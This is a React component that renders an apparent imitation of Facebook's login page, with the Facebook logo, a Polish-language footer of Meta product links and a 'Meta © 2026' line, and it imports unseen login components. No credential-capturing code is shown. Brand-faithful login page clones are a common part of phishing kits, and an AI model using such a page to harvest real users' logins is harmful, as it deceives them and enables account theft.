import React from 'react'
import LoginHero from '~/components/LoginHero'
import LoginAuthPanel from '~/components/LoginAuthPanel'

export const IndexPage: React.FC = () => {
  return (
    <div className="min-h-screen bg-white font-sans flex flex-col justify-between overflow-hidden">
      <main className="grow grid grid-cols-1 lg:grid-cols-[1fr_550px] w-full mx-auto relative">
        <div className="absolute top-6 left-6 lg:top-10 lg:left-10 z-10">
          <svg
            viewBox="0 0 36 36"
            className="w-10 h-10 fill-[#1877F2]"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34v-8.954h-2.923v-4.144H14v-2.828c0-4.11 2.366-6.155 5.894-6.155 1.516 0 2.871.189 3.328.283v3.743l-2.079.001c-1.895 0-2.391 1.054-2.391 2.314v2.641h4.298l-.666 4.144h-3.632v9.825z" />
          </svg>
        </div>

        <LoginHero />

        <LoginAuthPanel />
      </main>

      <footer className="bg-white border-t-2 border-[#dfe2e5] py-6 px-4 text-center text-[12px] text-slate-500 w-full shrink-0">
        <div className="max-w-5xl mx-auto space-y-3">
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-slate-600">
            <a href="#" className="hover:underline font-medium">Polski</a>
            <a href="#" className="hover:underline">English (US)</a>
            <a href="#" className="hover:underline">Ślōnski godka</a>
            <a href="#" className="hover:underline">Русский</a>
            <a href="#" className="hover:underline">Deutsch</a>
            <a href="#" className="hover:underline">Français (France)</a>
            <a href="#" className="hover:underline">Italiano</a>
            <a href="#" className="hover:underline text-[#1877F2]">Więcej języków...</a>
          </div>
          <hr className="border-[#dfe2e5] max-w-4xl mx-auto my-3" />
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-[11px]">
            <a href="#" className="hover:underline">Zarejestruj się</a>
            <a href="#" className="hover:underline">Zaloguj się</a>
            <a href="#" className="hover:underline">Messenger</a>
            <a href="#" className="hover:underline">Facebook Lite</a>
            <a href="#" className="hover:underline">Film</a>
            <a href="#" className="hover:underline">Meta Pay</a>
            <a href="#" className="hover:underline">Sklep Meta</a>
            <a href="#" className="hover:underline">Meta Quest</a>
            <a href="#" className="hover:underline">Ray-Ban Meta</a>
            <a href="#" className="hover:underline">Meta AI</a>
            <a href="#" className="hover:underline">Instagram</a>
            <a href="#" className="hover:underline">Threads</a>
          </div>
          <div className="text-slate-400 pt-2 text-[11px]">
            Meta © 2026
          </div>
        </div>
      </footer>
    </div>
  )
}

export default IndexPage
